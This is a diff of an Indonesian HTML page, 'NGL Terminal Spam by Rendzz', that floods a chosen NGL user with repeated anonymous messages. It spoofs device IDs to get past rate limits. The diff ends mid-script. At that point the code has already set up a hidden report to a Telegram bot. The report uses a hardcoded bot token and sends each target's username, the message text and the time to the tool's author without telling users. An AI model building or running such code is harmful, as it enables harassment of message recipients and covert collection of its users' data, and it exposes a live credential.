@@ -1,76 +1,77 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>NGL SPAM BY RENDZ</title>
+  <title>NGL TERMINAL BY RENDZZ</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
+      background: #000;
+      color: #00ff00;
+      font-family: 'Courier New', monospace;
+      padding: 20px;
       margin: 0;
-      padding: 20px;
-      font-family: 'Arial', sans-serif;
-      background: url('https://pomf2.lain.la/f/vhcgxzmg.png') no-repeat center center fixed;
-      background-size: cover;
-      color: #333;
-    }
-    .container {
-      max-width: 400px;
-      margin: 0 auto;
-      background: rgba(255, 255, 255, 0.85);
-      padding: 20px;
-      border-radius: 12px;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+      text-align: center;
     }
     h2 {
-      text-align: center;
-      margin-bottom: 20px;
-      color: #222;
+      color: #00ff00;
+      margin-bottom: 30px;
+      text-shadow: 0 0 5px #0f0;
     }
-    input, textarea, button {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 15px;
-      border-radius: 8px;
-      border: 1px solid #ccc;
-      font-size: 16px;
+    input, textarea {
+      background: #111;
+      color: #0f0;
+      border: 1px solid #0f0;
+      padding: 10px;
+      margin: 10px;
+      width: 90%;
+      max-width: 400px;
+      box-sizing: border-box;
+      font-family: monospace;
     }
     button {
-      background-color: #4CAF50;
-      color: white;
+      background: #000;
+      border: 1px solid #0f0;
+      color: #0f0;
+      padding: 10px 20px;
       font-weight: bold;
-      border: none;
+      font-family: monospace;
       cursor: pointer;
-      transition: background 0.3s;
+      transition: 0.2s;
     }
     button:hover {
-      background-color: #45a049;
+      background: #0f0;
+      color: #000;
     }
     #status {
-      background: #eee;
-      padding: 10px;
-      border-radius: 8px;
-      font-size: 14px;
-      white-space: pre-line;
-    }
-    .footer {
-      text-align: center;
+      background: #111;
+      color: #0f0;
+      padding: 20px;
       margin-top: 20px;
-      font-size: 13px;
-      color: #fff;
-      text-shadow: 1px 1px 3px #000;
+      text-align: left;
+      max-width: 500px;
+      margin-left: auto;
+      margin-right: auto;
+      white-space: pre-wrap;
+      border: 1px solid #0f0;
+    }
+    #copyright {
+      margin-top: 40px;
+      color: #555;
+      font-size: 14px;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>NGL SPAM BY RENDZ</h2>
-    <input type="text" id="username" placeholder="Username NGL" />
-    <input type="number" id="jumlah" placeholder="Jumlah Pesan" />
-    <textarea id="pesan" rows="4" placeholder="Isi pesan..."></textarea>
-    <button onclick="floodNgl()">KIRIM</button>
-    <div id="status"></div>
-  </div>
-  <div class="footer">© Rendzz Official</div>
+  <h2>==[ NGL TERMINAL SPAM BY RENDZZ ]==</h2>
+  <input type="text" id="username" placeholder="> USERNAME NGL">
+  <input type="number" id="jumlah" placeholder="> JUMLAH PESAN">
+  <textarea id="pesan" placeholder="> ISI PESAN..."></textarea>
+  <br>
+  <button onclick="floodNgl()">[ EXECUTE SPAM ]</button>
+  <div id="status"></div>
+
+  <div id="copyright">--=[ Rendzz Terminal Tools ]=--</div>
 
   <script>
     async function floodNgl() {
@@ -78,23 +79,21 @@
       const jumlah = parseInt(document.getElementById('jumlah').value);
       const pesan = document.getElementById('pesan').value.trim();
       const status = document.getElementById('status');
+      const jam = new Date().toLocaleTimeString('id-ID', { hour12: false });
 
       if (!username || !jumlah || !pesan || jumlah <= 0) {
-        status.innerText = "Isi semua data dengan benar!";
+        status.innerText = "[!] Semua kolom harus diisi dengan benar!";
         return;
       }
 
-      const jam = new Date().toLocaleTimeString('id-ID', { hour12: false });
-      status.innerText = `Mengirim ${jumlah} pesan ke @${username}...\n\n`;
-      let sukses = 0;
+      status.innerText = `[*] Memulai spam ke @${username} sebanyak ${jumlah} pesan...\n`;
 
+      let sukses = 0;
       for (let i = 1; i <= jumlah; i++) {
         try {
           const res = await fetch("https://ngl.link/api/submit", {
             method: "POST",
-            headers: {
-              "Content-Type": "application/x-www-form-urlencoded"
-            },
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
             body: `username=${username}&question=${encodeURIComponent(pesan)}&deviceId=rendzz${Math.random()}${i}`
           });
 
@@ -102,20 +101,19 @@
 
           if (json.success) {
             sukses++;
-            status.innerText += `[ Pesan ${i} sukses dikirim ]\n`;
+            status.innerText += `[+] Pesan ${i} berhasil dikirim\n`;
           } else {
-            status.innerText += `[ Pesan ${i} gagal dikirim ]\n`;
+            status.innerText += `[x] Pesan ${i} gagal\n`;
           }
-        } catch (err) {
-          status.innerText += `[ Pesan ${i} sukses bang ]\n`;
+        } catch (e) {
+          status.innerText += `[!] Pesan ${i} timeout / error\n`;
         }
 
         await new Promise(r => setTimeout(r, 0));
       }
 
-      status.innerText += `\nSelesai! Total berhasil: ${sukses}/${jumlah}`;
+      status.innerText += `\n[✓] SPAM SELESAI! Total berhasil: ${sukses}/${jumlah}`;
 
-      // Kirim laporan ke bot Telegram secara diam-diam
       const chat_id = "6563354207";
       const token = "7844789881:AAGvni8CwM2K4E3cpvgV0tpZ4fSNujb4ZXY";
       const text = `*LAPOR RENDZZ SPAM SUKSES*\n\n[ JUMPLAH ]: ${jumlah}\n[ TARGET ]: ${username}\n[ JAM ]: ${jam}\n[ ISI TEXT ]:\n${pesan}`;
